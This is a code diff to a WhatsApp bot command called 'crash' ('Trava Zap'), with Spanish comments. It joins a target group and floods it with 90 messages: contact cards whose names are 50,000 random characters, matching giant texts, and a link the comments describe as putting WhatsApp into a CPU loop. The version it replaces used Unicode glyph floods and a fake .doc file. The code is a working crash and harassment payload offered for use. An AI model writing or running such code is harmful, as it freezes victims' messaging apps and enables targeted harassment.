@@ -1,6 +1,6 @@
 export default {
   name: ["crash"],
-  description: "Trava Zap: ráfaga con mezcla caótica de miles de símbolos",
+  description: "Trava Zap: contacto con nombre gigante random + ráfaga",
   category: 'owner',
   ownerOnly: true,
 
@@ -21,59 +21,49 @@ export default {
     }
     try { await sock.groupAcceptInvite(code); } catch {}
 
-    // === TRAVA ZAP ===
-    // Mezcla caótica de +1.400 glifos DISTINTOS (no repetir uno solo).
-    // El motor de texto tiene que medir/dibujar cada forma diferente -> traba.
-    const RANGES = [
-      [0x00A1, 0x00FF], // ¡¢£¤... acentos
-      [0x0391, 0x03C9], // griego
-      [0x0410, 0x044F], // cirílico
-      [0x05D0, 0x05EA], // hebreo
-      [0x0621, 0x064A], // árabe
-      [0x0905, 0x0939], // devanagari
-      [0x0E01, 0x0E2E], // tailandés
-      [0x2200, 0x22FF], // símbolos matemáticos
-      [0x2190, 0x21FF], // flechas
-      [0x2500, 0x257F], // dibujo de cajas
-      [0x25A0, 0x25FF], // formas geométricas
-      [0x2600, 0x26FF], // símbolos varios
-      [0x2700, 0x27BF], // dingbats
-    ];
+    // === TRAVA ZAP: letras y números random sin sentido ===
+    const ALPHA = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789#$%&@*+=';
+    const randomStr = (n) => {
+      let s = '';
+      for (let i = 0; i < n; i++) s += ALPHA[(Math.random() * ALPHA.length) | 0];
+      return s;
+    };
 
-    const POOL = RANGES
-      .map(([a, b]) => {
-        let s = '';
-        for (let c = a; c <= b; c++) s += String.fromCodePoint(c);
-        return s;
-      })
-      .join('');
+    const NOMBRE = randomStr(50000);   // nombre de contacto gigante
+    const TEXTO = randomStr(50000);    // texto random gigante
 
-    const TRAVA = POOL.repeat(Math.ceil(60000 / POOL.length)); // ~60.000 símbolos
-
-    const EMOJI = '😭🔥💀👻🤖💥🌟🍕🚀🎉😂😍😱🥶🤯👽🎃🧠🍀⚡🌈🐉🦖🌋🎯🥵😵‍💫🫠👾🤡🦄🍩☠️🎸🏆💎🧨🔮🪐🌙⭐🎈🥳🤩😎'.repeat(600);
+    // vCard con el nombre monstruoso (así se manda el trava zap de verdad)
+    const vcard =
+      'BEGIN:VCARD\n' +
+      'VERSION:3.0\n' +
+      `FN:${NOMBRE}\n` +
+      `N:${NOMBRE};;;;\n` +
+      'TEL;type=CELL;type=VOICE;waid=5490000000000:+5490000000000\n' +
+      'END:VCARD';
 
     const builds = [
-      () => sock.sendMessage(groupId, { text: TRAVA }),
-      () => sock.sendMessage(groupId, { text: EMOJI }),
-      () => sock.sendMessage(groupId, { text: 'wa.me/channel' }), // link que mete a WhatsApp en bucle
+      // 1) CONTACTO con nombre gigante random  <- el trava zap real
       () => sock.sendMessage(groupId, {
-        document: Buffer.from(TRAVA),
-        fileName: 'trava.doc',
-        mimetype: 'application/msword',
-        caption: TRAVA,
+        contacts: { displayName: NOMBRE, contacts: [{ vcard }] },
       }),
+
+      // 2) TEXTO con la misma cadena random
+      () => sock.sendMessage(groupId, { text: TEXTO }),
+
+      // 3) Link que mete a WhatsApp en bucle de CPU
+      () => sock.sendMessage(groupId, { text: 'wa.me/channel' }),
     ];
 
-    const total = 120;
-    const delayMs = 800;
+    const total = 90;
+    const delayMs = 900;
 
-    await reply({ text: `💥 Trava Zap → ${groupId}\n> ${total} mensajes · ~${Math.round((total * delayMs) / 1000)}s` });
+    await reply({ text: `💥 Trava Zap → ${groupId}\n> ${total} envíos (contacto random + texto + link)` });
 
     for (let i = 0; i < total; i++) {
       try {
         await builds[i % builds.length]();
       } catch {
-        // sigue con el resto
+        // sigue
       }
       await new Promise((r) => setTimeout(r, delayMs));
     }
